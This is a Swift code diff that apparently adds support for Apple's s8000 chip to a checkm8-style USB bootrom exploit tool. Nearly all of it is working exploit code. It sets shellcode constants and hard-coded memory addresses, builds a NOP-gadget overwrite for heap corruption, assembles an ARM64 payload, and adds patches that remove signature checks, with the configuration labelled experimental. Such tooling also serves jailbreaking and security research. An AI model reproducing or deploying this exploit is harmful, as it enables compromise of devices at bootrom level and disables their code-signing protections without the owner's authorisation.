@@ -150,7 +150,38 @@ fileprivate func getDevicePayload(device: Int) -> Data {
         let s5l8960_payload = s5l8960x_shellcode + Data(repeating: 0, count: Int(PAYLOAD_OFFSET_ARM64 - UInt64(s5l8960x_shellcode.count))) + s5l8960x_handler
         
         return s5l8960_payload
-        
+       
+	case 0x8000: 
+		// s8000 patches from a1exdandy - https://gist.github.com/a1exdandy/ae3fb332efac879e97a41291f7fef727
+		let constants_usb_s8003 = [
+			0x180380000,        // 1 - LOAD_ADDRESS
+			0x6578656365786563, // 2 - EXEC_MAGIC
+			0x646F6E65646F6E65, // 3 - DONE_MAGIC
+			0x6D656D636D656D63, // 4 - MEMC_MAGIC
+			0x6D656D736D656D73, // 5 - MEMS_MAGIC
+			0x10000EE78,        // 6 - USB_CORE_DO_IO
+			] as [UInt64]
+				
+		let constants_checkm8_s8003 = [
+            0x1800877E0, 		  // 1 - gUSBDescriptors
+            0x180087958, 		  // 2 - gUSBSerialNumber
+            0x10000E354, 		  // 3 - usb_create_string_descriptor
+            0x1800807DA, 		  // 4 - gUSBSRNMStringDescriptor
+            0x1800E0C00, 		  // 5 - PAYLOAD_DEST
+			PAYLOAD_OFFSET_ARM64, // 6 - PAYLOAD_OFFSET
+			PAYLOAD_SIZE_ARM64,   // 7 - PAYLOAD_SIZE
+            0x1800878F8, 		  // 8 - PAYLOAD_PTR
+		] as [UInt64]
+	
+     let s8003_handler = asm_arm64_x7_trampoline(dest: 0x10000F1B0) + asm_arm64_branch(src: 0x10, dest: 0x0) + loadShellcode64(name: "usb_0xA1_2_arm64", constants: constants_usb_s8003).advanced(by: 4)
+     let s8003_shellcode = loadShellcode64(name: "checkm8_nopaddingcorruption_arm64", constants: constants_checkm8_s8003)
+     require(s8003_shellcode.count <= PAYLOAD_OFFSET_ARM64)
+     require(s8003_handler.count <= PAYLOAD_SIZE_ARM64)
+	 
+	 let s8003_payload = s8003_shellcode + Data(repeating: 0, count: Int(PAYLOAD_OFFSET_ARM64 - UInt64(s8003_shellcode.count))) + s8003_handler
+	 
+     return s8003_payload
+	 
     case 0x8010:
         let constants_usb_t8010 = [
             0x1800B0000,        // 1 - LOAD_ADDRESS
@@ -256,6 +287,7 @@ fileprivate func getDevicePayload(device: Int) -> Data {
 }
 
 fileprivate func getDeviceConfigs() -> [PwnUSBDeviceConfig] {
+	let s8000_nop_gadget: UInt64 = 0x10000de34
     let t8010_nop_gadget: UInt64 = 0x10000CC6C
     let t8011_nop_gadget: UInt64 = 0x10000CD0C
     
@@ -265,6 +297,11 @@ fileprivate func getDeviceConfigs() -> [PwnUSBDeviceConfig] {
     let s5l8960_rmsigchks = rmsigchks_patchesFor(device: 0x8960)
     let s5l8960_iStrap = iStrap_patchesFor(device: 0x8960)*/
     
+	let s8000_overwrite = struct_pack("32xQ8x", s8000_nop_gadget, 0x1800B0800 as UInt64)
+	let s8000_payload = getDevicePayload(device: 0x8000)
+	let s8000_rmsigchks = rmsigchks_patchesFor(device: 0x8000)
+	let s8000_iStrap = iStrap_patchesFor(device: 0x8000)
+	
     let t8010_overwrite = struct_pack("<32x2Q", t8010_nop_gadget, 0x1800B0800 as UInt64)
     let t8010_payload = getDevicePayload(device: 0x8010)
     let t8010_rmsigchks = rmsigchks_patchesFor(device: 0x8010)
@@ -279,6 +316,9 @@ fileprivate func getDeviceConfigs() -> [PwnUSBDeviceConfig] {
         // s5l8960 - NOT SUPPORTED
         //PwnUSBDeviceConfig(version: "iBoot-1704.10", largeLeak: true, leak: 7936, overwrite: s5l8960_overwrite, overwriteOffset: 0x5C0, hole: 0, payload: s5l8960_payload, dfuUploadBase: 0x180380000, rmsigchksPatches: s5l8960_rmsigchks, iStrapPatches: s5l8960_iStrap, iStrapDisableDFUFunc: 0x100006618),
         
+		// s8000 - EXPERIMENTAL
+		PwnUSBDeviceConfig(version: "iBoot-2234.0.0.3.3", largeLeak: false, leak: 1, overwrite: s8000_overwrite, overwriteOffset: 0x500, hole: 5, payload: s8000_payload, dfuUploadBase: 0x1800B0000, rmsigchksPatches: s8000_rmsigchks, iStrapPatches: s8000_iStrap, iStrapDisableDFUFunc: 0x0),
+		
         // t8010
         PwnUSBDeviceConfig(version: "iBoot-2696.0.0.1.33", largeLeak: false, leak: 1, overwrite: t8010_overwrite, overwriteOffset: 0x5C0, hole: 5, payload: t8010_payload, dfuUploadBase: 0x1800B0000, rmsigchksPatches: t8010_rmsigchks, iStrapPatches: t8010_iStrap, iStrapDisableDFUFunc: 0x0),
         
